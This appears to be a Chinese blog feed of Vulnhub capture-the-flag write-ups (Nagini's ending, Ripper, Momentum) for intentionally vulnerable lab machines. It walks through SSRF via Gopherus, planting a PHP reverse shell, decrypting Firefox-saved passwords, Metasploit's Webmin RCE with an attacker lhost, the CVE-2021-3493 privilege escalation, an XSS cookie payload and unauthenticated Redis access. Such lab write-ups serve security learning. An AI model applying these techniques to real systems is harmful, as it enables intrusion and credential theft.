<p>如果rustc报错，先卸载当前的，然后下载，命令如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">卸载: sudo apt purge rustc</span><br><span class="line">下载: </span><br><span class="line">	curl --proto &#x27;=https&#x27; --tlsv1.2 -sSf https://sh.rustup.rs | sh</span><br><span class="line">	弹出互动，输入1</span><br><span class="line">	然后输入：source $HOME/.cargo/env</span><br></pre></td></tr></table></figure></p>
<hr />
<h2 id="ssrf-mysql">SSRF + MySql</h2>
<p>直接访问：10.0.2.22/internalResourceFeTcher.php</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422172743.png" /></p>
<p>经过测试发现，这里存在着SSRF漏洞。又根据提示，查看配置文件，发现里面有MySQL数据库的相关信息，因此猜测这里应该使用SSRF攻击MySql数据库，从而获取数据库中的信息。</p>
<p>利用工具：<a href="https://github.com/tarunkant/Gopherus">GitHub -
tarunkant/Gopherus: This tool generates gopher link for exploiting SSRF
and gaining RCE in various servers</a></p>
<p>使用方式很简单：<code>./gopherus.py --exploit mysql</code>，如果是不同的数据库，后面修改一下就可以</p>
<h3 id="查看数据库中有哪些表">查看数据库中有哪些表</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173341.png" /></p>
<p>然后将生成的url粘贴到网页中的输入框，这里可能会不成功，多刷新几次就好了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173441.png" /></p>
<p>发现joomla数据库下有许多的表，我们主要关注一个叫做<code>joomla_users</code>的表，这里最有可能存在着用户的登录信息。</p>
<h3 id="查看表下的字段">查看表下的字段</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422173716.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174138.png" /></p>
<p>def后面跟着的分别是“数据库、表名、字段名”这些信息。如果看的不清楚可以按F12然后查看</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422174354.png" /></p>
<p>我们只需要关注有一个字段为email，其后一个字段为密码，其前一个字段为username。因此<code>site_admin@nagini,hogwarts</code>这个应该是email，那么后面跟着的就是密码，前面就是用户名site_admin。可以尝试破解该密码，但是并不推荐，这里推荐直接修改掉site_admin的密码。</p>
<h3 id="修改site_admin密码">修改site_admin密码</h3>
<p>先生成一个md5的密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(hdfzzf㉿kali)-[~]</span><br><span class="line">└─$ echo -n &quot;pass&quot; | md5sum</span><br><span class="line">1a1dc91c907325c69271ddf0c944bc72  -</span><br></pre></td></tr></table></figure></p>
<p>注意，一定要加-n。然后</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175005.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175046.png" /></p>
<p>然后去10.0.2.22/joomla/administrator/index.php，用修改后的密码登录。</p>
<h2 id="get-shell">get shell</h2>
<p>进入后台之后如何get shell可以查看：<a
href="4.%20Vulnhub%20AdmX%20Writeup.md">4. Vulnhub AdmX Writeup</a></p>
<p>直接寻找模板 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Templates -&gt; Templates -&gt; [随便选一个] -&gt; [随便选一个php文件]</span><br></pre></td></tr></table></figure></p>
<p>将<code>/usr/share/webshells/php/php-reverse-shell.php</code>的内容代替原来php的内容，注意修改ip和端口。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422175900.png" /></p>
<p>可以利用dirsearch找到对应php文件的路径。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180121.png" /></p>
<p>kali监听对应的端口，然后网页访问该文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422180226.png" /></p>
<h2 id="权限提升">权限提升</h2>
<h3 id="获得snape用户权限">获得snape用户权限</h3>
<p>发现靶机上存在三个用户root, hermoine,
snape。先查看snape的家目录，发现有一个奇怪的文件
.creds.txt，这看上去会像是一个口令，因此查看内容，发现是经过base64编码的
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// .creds.txt</span><br><span class="line">TG92ZUBsaWxseQ==</span><br><span class="line">-&gt; Love@lilly</span><br></pre></td></tr></table></figure></p>
<p>猜测这可能是ssh登录的密码，尝试登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194046.png" /></p>
<p>成功登录。</p>
<h3 id="获得hermoine用户权限">获得hermoine用户权限</h3>
<p>先到对应的家目录，查看内容。发现了三个比较奇怪的点：</p>
<ol type="1">
<li>家目录下存在着.ssh目录，如果存在ssh密钥登录，那么对应的公钥就会保存在该目录下。但是现在里面为空；</li>
<li>家目录下居然有一个bin目录，这不应该在这，而且里面的文件居然有suid权限，属主为hermoine，并且是可执行文件，初步猜测利用该文件获得hermoine的权限；</li>
<li>还有一个奇怪的目录.mozilla，这是火狐浏览器的目录，但是现在没有权限查看；</li>
</ol>
<p>先去看一下suid文件的作用</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422194531.png" /></p>
<p>发现这就是一个将目标文件cp到另一个地方的可执行文件，结合.ssh目录，猜测：<strong>利用该程序将ssh公钥放入到hermoine的.ssh目录下，然后使用ssh密钥登录</strong></p>
<p>在kali上生成ssh公、私钥（注意，kali哪个用户生成的就用哪个用户登录！！！）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">输入命令之后，一直回车就好了</span><br></pre></td></tr></table></figure></p>
<p>将公钥发送到snape用户的目录里去 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp id_rsa.pub snape@10.0.2.22:~/ <span class="comment"># 拷贝文件到对应</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195004.png" /></p>
<p>然后利用 su_cp
将公钥复制到/home/hermoine/.ssh目录下，并且名字一定要改为authorized_keys！！！否则无法登录，我尝试过！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195336.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195515.png" /></p>
<p>其他尝试过，都不能登录。</p>
<p>然后利用密钥登录即可</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422195550.png" /></p>
<h3 id="获得root权限">获得root权限</h3>
<p>这台靶机利用的方式比较奇怪。还记得刚刚在hermoine目录下的.mozilla吗，里面保存的都是一些火狐浏览器相关的信息，当然也包括一些登录信息。</p>
<p>进入到.mozilla/firefox/g2mhbq0o.default目录内，发现有logins.json和key4.db文件，利用工具提取出里面的信息，工具地址：<a
href="https://github.com/lclevy/firepwd">GitHub - lclevy/firepwd:
firepwd.py, an open source tool to decrypt Mozilla protected
passwords</a></p>
<p>该工具的作用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This educational tool was written to illustrate how Mozilla passwords (Firefox, Thunderbird) are protected using contents of files key4.db (or key3.db), logins.json (or signons.sqlite)</span><br></pre></td></tr></table></figure></p>
<p>将logins.json和key4.db文件与firepwd.py放到同一个目录下，然后执行
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 firepwd.py</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200531.png" /></p>
<p>得到用户名和密码，直接ssh登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220422200625.png" /></p>
<p>成功获得root权限，现在依次查看三个flag，分别是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /var/www/html/horcrux1.txt</span><br><span class="line">horcrux_&#123;MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O&#125;</span><br><span class="line">-&gt; horcrux_&#123;3: SlythEriN&#x27;s LocKEet dEstroYeD bY RoN&#125;</span><br><span class="line"></span><br><span class="line">// /home/hermoine/horcrux2.txt</span><br><span class="line">horcrux_&#123;NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=&#125;</span><br><span class="line">-&gt; horcrux_&#123;4: Helga Hufflepuff&#x27;s Cup destroyed by Hermione&#125;</span><br><span class="line"></span><br><span class="line">// /root/horcrux3.txt</span><br><span class="line">  ____                            _         _       _   _                 </span><br><span class="line"> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ </span><br><span class="line">| |   / _ \| &#x27;_ \ / _` | &#x27;__/ _` | __| | | | |/ _` | __| |/ _ \| &#x27;_ \/ __|</span><br><span class="line">| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \</span><br><span class="line"> \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/</span><br><span class="line">                  |___/                                                   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Machine Author: Mansoor R (@time4ster)</span><br><span class="line">Machine Difficulty: Medium</span><br><span class="line">Machine Name: Nagini</span><br><span class="line">Horcruxes Hidden in this VM: 3 horcruxes</span><br><span class="line"></span><br><span class="line">You have successfully pwned Nagini machine.</span><br><span class="line">Here is your third hocrux: horcrux_&#123;NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=&#125;</span><br><span class="line">-&gt; horcrux_&#123;5: Diadem of Ravenclaw destroyed by Harry&#125;</span><br><span class="line"></span><br><span class="line"># For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">总结</h1>
<p>该靶机难度挺大的，主要是涉及到许多没见过的知识点：</p>
<ul>
<li>Gopher + SSRF</li>
<li>HTTP3协议</li>
<li>浏览器密码还原</li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SSRF</tag>
        <tag>HTTP3协议</tag>
        <tag>Gopher</tag>
        <tag>浏览器密码还原</tag>
      </tags>
  </entry>
  <entry>
    <title>15 Vulnhub Ripper Writeup</title>
    <url>/2022/04/24/15%20Vulnhub%20Ripper%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度为中、低，涉及到了rips这个之前没有了解过的工具。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/ripper-1,706/">Ripper: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低 -&gt; 中</li>
</ul>
<p>目标：</p>
<ul>
<li>取得root权限</li>
<li>拿到2个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li><strong>Web信息搜索</strong></li>
<li><strong>内部系统泄露</strong></li>
<li>代码审计</li>
<li><strong>备份文件泄密</strong></li>
<li>Webmin漏洞利用</li>
<li>Metasploit</li>
<li>CVE-2021-3493(专门针对Ubuntu)</li>
</ul>
<p>参考资料：</p>
<ul>
<li><a href="http://rips-scanner.sourceforge.net/">RIPS - free PHP
security scanner using static code analysis</a></li>
<li><a href="https://github.com/briskets/CVE-2021-3493">GitHub -
briskets/CVE-2021-3493: Ubuntu OverlayFS Local Privesc</a></li>
<li><a href="https://san3ncrypt3d.com/2021/06/20/ripper/">Ripper VulnHub
Walkthrough – San3ncrypt3d – Making cybersecurity a habit &amp; Privacy
a Goal</a></li>
<li><a href="https://www.yiibai.com/linux/find.html">find命令 -
Linux命令大全教程™</a></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<p>kali: 10.0.2.4</p>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.23</span><br><span class="line">sudo nmap -p22,80,10000 -sV 10.0.2.23</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153009.png" /></p>
<p>收集信息：</p>
<ul>
<li>22端口上的服务是ssh</li>
<li>80端口的服务为http，版本为Apache2.4.29</li>
<li>10000端口的服务为http，版本为webmin 1.910</li>
</ul>
<p>这里，我百度了一下webmin
1.910，发现webmin是一个开源的web应用程序，并且版本&lt;=1.910的存在远程命令执行漏洞，不过需要知道用户名和密码。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>首先查看了以下80端口，发现就是Apache的一个安装好之后的界面，并没有更多的信息。接着又访问了10000端口，提示需要用SSL模式，也就是https访问</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153310.png" /></p>
<p>进入之后，得到一个登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153331.png" /></p>
<p>尝试使用默认账号 admin/admin
登录，发现没有效果。又尝试了几个弱口令，发现也没有任何效果。</p>
<p>先查看以下80端口的robots.txt，发现80端口不存在该文件。查看10000端口的该文件，发现了一丝信息</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153627.png" /></p>
<p>将其base64解码得到一句话：<strong>we scan php codes with
rips</strong></p>
<p>然后百度什么是rips，发现这是一款静态的php的代码审计攻击（官网在[[#靶机信息]]给出），默认的打开方式为
<code>http://localhost/rips</code>，于是依次尝试在80端口和10000端口访问，最终80端口上成功出现了该工具的页面。</p>
<blockquote>
<p>网上有人使用dirbuster爆破出rips目录。</p>
</blockquote>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424153904.png" /></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>先扫描/var/www这个目录下的文件，很快就得到了结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154139.png" /></p>
<p>发现，这里可以看到许多php文件的源码，并且给出了可能存在的漏洞。尝试利用一下<code>/var/www/html/rips/windows/code.php</code>的文件暴露漏洞。但是这个漏洞不能读取不同目录下的文件，只能够读取同目录下的文件，而且只是简单的把文件内容暴露出来，并不会把代码执行。因此，目前没有利用价值。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154541.png" /></p>
<p>再次回到rips界面，可以利用/regex/搜索包含某些关键词的php文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154521.png" /></p>
<p>发现了一个<code>secret.php</code>文件，这名字一看就隐藏着密码。</p>
<p>其实也可以同通过下图中的file功能列出扫描的所有php文件</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424154708.png" /></p>
<p>该文件中的信息如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user name: ripper</span><br><span class="line">pass: Gamespeopleplay</span><br></pre></td></tr></table></figure></p>
<p>起初还以为这是10000端口的登录账号和密码，但是尝试过后发现并不是。因此目前只有ssh需要密码。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155132.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<h3 id="获得cubes权限">2.4.1. 获得cubes权限</h3>
<p>发现/home目录下除了ripper之外，存在着另一个用户cubes。那么接下来可能就是需要先拿到cubes的权限，然后再拿到root权限。</p>
<p>经过信息收集发现之前的一些提权手段都没法使用。接下来可以使用下面的命令找到属主是cubes但是ripper可读的文件。
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155612.png" /></p>
<p>又发现了一个secret.file文件，直接查看该文件，文件内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is my secret file</span><br><span class="line"></span><br><span class="line">[file system]</span><br><span class="line">-passwd : Il00tpeople</span><br></pre></td></tr></table></figure></p>
<p>又得到了一个密码，因为属主是cubes，可能这就是cubes用户的ssh登录密码，直接尝试</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424155811.png" /></p>
<p>成功获得cubes权限。</p>
<h3 id="获得root权限">2.4.2. 获得root权限</h3>
<h4 id="方法1">2.4.2.1. 方法1</h4>
<p>接下来同样信息收集，发现之前的手段还是无法利用。因此再次输入上述命令（稍作修改）：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user cubes -<span class="built_in">type</span> f -<span class="built_in">exec</span> ls -la &#123;&#125; \; 2&gt;/dev/null|grep -v <span class="string">&quot;proc&quot;</span>|grep -v <span class="string">&quot;.png&quot;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160020.png" /></p>
<p>经过对文件的查看，发现
miniser.log，我们知道10000端口上的服务正好就是miniserv，那么这个文件保存的应该就是相关的日志，查看其中的内容，发现了一条重要的信息：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authentication : session_login.cgi=username=admin&amp;pass=tokiohotel</span><br></pre></td></tr></table></figure></p>
<p>这应该就是10000端口的登录界面的账号密码了。成功登录到后台后找到<code>others -&gt; command shell</code>能够直接获得一个shell，惊讶的发现这居然是root权限。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160511.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424160527.png" /></p>
<p>此时可以直接读取flag。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /home/ripper/flag.txt</span><br><span class="line">__________.____________________________________________ </span><br><span class="line">\______   \   \______   \______   \_   _____/\______   \</span><br><span class="line"> |       _/   ||     ___/|     ___/|    __)_  |       _/</span><br><span class="line"> |    |   \   ||    |    |    |    |        \ |    |   \</span><br><span class="line"> |____|_  /___||____|    |____|   /_______  / |____|_  /</span><br><span class="line">        \/                                \/         \/ </span><br><span class="line"></span><br><span class="line">flag&#123;15ea80f080be3714df1ef97bac5d7151&#125;</span><br><span class="line"></span><br><span class="line">C0ngratulation on getting user ! Lets get root now :)</span><br><span class="line"></span><br><span class="line">// 2. /root/flag.txt</span><br><span class="line">.---..-.-.-..-..-..--.     .---. .-..---..---..---..---. </span><br><span class="line">| |-&#x27;| | | || .` || \ \### | |-&lt; | || |-&#x27;| |-&#x27;| |- | |-&lt; </span><br><span class="line">`-&#x27;  `-----&#x27;`-&#x27;`-&#x27;`-&#x27;-&#x27;    `-&#x27;`-&#x27;`-&#x27;`-&#x27;  `-&#x27;  `---&#x27;`-&#x27;`-&#x27;</span><br><span class="line"></span><br><span class="line">COngrats !!! You have rooted this box !!</span><br><span class="line"></span><br><span class="line">Follow me on twitter @san3ncrypt3d</span><br></pre></td></tr></table></figure></p>
<h4 id="方法2">2.4.2.2. 方法2</h4>
<p>登录后台之后，可以利用之前提到的远程执行漏洞获得root权限。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161007.png" /></p>
<p>依次将参数填入： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhost 10.0.2.23</span><br><span class="line">set password tokiohotel</span><br><span class="line">set username admin</span><br><span class="line">set SSL true # 切记，10000端口要求ssl</span><br><span class="line">set lhost 10.0.2.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161215.png" /></p>
<p>得到session后，输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
<p>得到一个交互式的shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161414.png" /></p>
<h4 id="方法3">2.4.2.3. 方法3</h4>
<p>通过信息收集，发现靶机的操作系统是Ubuntu <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.5 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure></p>
<p>而 CVE-2021-3493
是专门针对Ubuntu的一个漏洞。因此可以直接利用。我们先回到ripper用户，由于靶机上没有gcc，因此在kali上编译完成之后发送到靶机执行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1. 编译</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line"></span><br><span class="line">// 2. 发送到靶机</span><br><span class="line">scp exp ripper@10.0.2.23:~/ <span class="comment"># 需要输入密码</span></span><br><span class="line"></span><br><span class="line">// 3. 执行</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162026.png" /></p>
<h3 id="番外">2.4.3. 番外</h3>
<p>刚开始的时候并不会使用find命令，而是一个一个文件查看，直到查看了/home/ripper/.bash_history，内容如下（后面的一些命令记录的是我们使用的，但是前面的是作者使用的）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162218.png" /></p>
<p>然后才去找secret.file文件，因此拿到cubes的权限。获得root权限也是如此，查看/home/cubes/.bash_history</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162508.png" /></p>
<p>然后查看其中涉及的许多文件，发现了miniserv.log中记录着登录界面的用户名和密码。后面的步骤和方法2一致了。</p>
<h1 id="总结">3. 总结</h1>
<p>该靶机的难度在于能否在到rips的路径，以及信息收集的能力，如果没有使用find命令，那就需要看许多的文件才可以提升权限。</p>
<p>该靶机的发布时间是早于 CVE-2021-3493
的，因此放法2只能算是取巧了。</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>rips代码审计</tag>
        <tag>备份文件泄密</tag>
        <tag>CVE-2021-3493</tag>
        <tag>Webmin漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>16 Vulnhub Momentum Writeup</title>
    <url>/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，如果之前就知道redis相关漏洞的话，那难度就是简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/momentum-1,685/">Momentum: 1
~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<p>涉及攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>Web路径爆破</li>
<li><strong>JS脚本分析</strong></li>
<li><strong>AES解密</strong></li>
<li><strong>Redis认证漏洞</strong></li>
</ul>
<p>参考：</p>
<ul>
<li><a
href="https://www.freebuf.com/articles/web/249238.html">Redis系列漏洞总结
- FreeBuf网络安全行业门户</a></li>
<li><a
href="http://www.npmdoc.org/crypto-jszhongwenwendangcrypto-js-jszhongwenjiaochengjiexi.html">crypto-js资料</a></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.239</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.239</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160344.png" /></p>
<p>信息：</p>
<ul>
<li>22端口的服务位ssh</li>
<li>80端口的服务为http</li>
<li>靶机操作系统为Debian</li>
</ul>
<h2 id="访问http服务-get-shell">2.2. 访问http服务 + get shell</h2>
<h3 id="http服务">2.2.1. http服务</h3>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160525.png" /></p>
<p>网站的页面有四张图片，并且这些图片可以点击，第一次点击可以放大图片，第二次点击就会显示图片的详细信息。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160616.png" /></p>
<p>注意到url中有一个参数id，并且id的值和这张图片的name是一样的。如果id随便输入，会发现页面显示的和我们输入的是一样的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160756.png" /></p>
<p>之前说过，这种情况下可能存在着三种类型的漏洞：</p>
<ol type="1">
<li>SQL注入、</li>
<li>XSS</li>
<li>SSTI</li>
</ol>
<p>经过尝试，只存在XSS漏洞，但是目前还没有什么用。</p>
<p>查看源码也没发现多少有用的信息，接下来进行路径扫描。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161035.png" /></p>
<p>经过对所有目录的查看，最终发现/js/main.js中的代码有点奇怪：
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewDetails</span>(<span class="params">str</span>) </span>&#123;                                                                                </span><br><span class="line">  <span class="built_in">window</span>.location.href = <span class="string">&quot;opus-details.php?id=&quot;</span>+str;                                                       </span><br><span class="line">&#125;                                                                                                          </span><br><span class="line"><span class="comment">/*                                                                                                       </span></span><br><span class="line"><span class="comment">var CryptoJS = require(&quot;crypto-js&quot;);                                                                       </span></span><br><span class="line"><span class="comment">var decrypted = CryptoJS.AES.decrypt(encrypted, &quot;SecretPassphraseMomentum&quot;);</span></span><br><span class="line"><span class="comment">console.log(decrypted.toString(CryptoJS.enc.Utf8));</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<p>（我不怎么会js）根据对代码的分析，我们刚刚输入的id，然后会经过viewDetails定位到对应的文件，然后返回相关信息，如果没有对应的文件，就直接显示id的值。这里的重点在于注释部分，<strong>先是调用了crypto-js库，然后调用了解密方法，最后将解密的结果变成字符串</strong>。</p>
<p>经过搜索，发现这个库的decrypt方法的使用如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161944.png" /></p>
<p>因此猜测 SecretPassphraseMomentum
就是解密的密钥，那么现在就需要找到加密后的字符串解密就可以了。</p>
<p>这时候想到了之前得到的XSS漏洞，一般XSS都和cookie有关，因此利用该漏洞查看一下cookie的值（也可以直接抓包）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>得到cookie的值 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</span><br></pre></td></tr></table></figure></p>
<p>随便找一个AES在线解密平台，解密得到一串字符： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<h3 id="get-shell">2.2.2. get shell</h3>
<p>现在只有一个ssh需要用户名和密码，因此尝试登录，最终的用户名和密码为：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户名: auxerre</span><br><span class="line">密码: auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162538.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>首先进行信息收集，发现靶机的内核版本不是最新的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162635.png" /></p>
<p>因此尝试用msf搜索，虽然有几个可以利用的exp，但是经尝试，都无法提权。最终在查看
/etc/passwd 的时候发现了一个特殊的用户 redis</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162742.png" /></p>
<p>这是一个非关系型的数据库，一直都有许多的安全问题。其中有一个<strong>未授权认证的漏洞</strong>，就是只要部署了redis，那么就会监听所有的网卡，并且只要能够访问到当前主机，那么都可以访问到redis，不需要经过认证就可以进行操作！redis默认监听6479端口，因此先查看端口，看一下是否启用了redis</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163318.png" /></p>
<p>发现确实启用了。那么直接访问 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli <span class="comment"># 访问redis</span></span><br><span class="line">info <span class="comment"># 查看相关信息，如果能显示，说明存在未授权认证漏洞</span></span><br><span class="line">keys * <span class="comment"># 获取所有键</span></span><br><span class="line">get keyName <span class="comment"># 获取键的信息</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163858.png" /></p>
<p>利用得到的密码登录root</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163932.png" /></p>
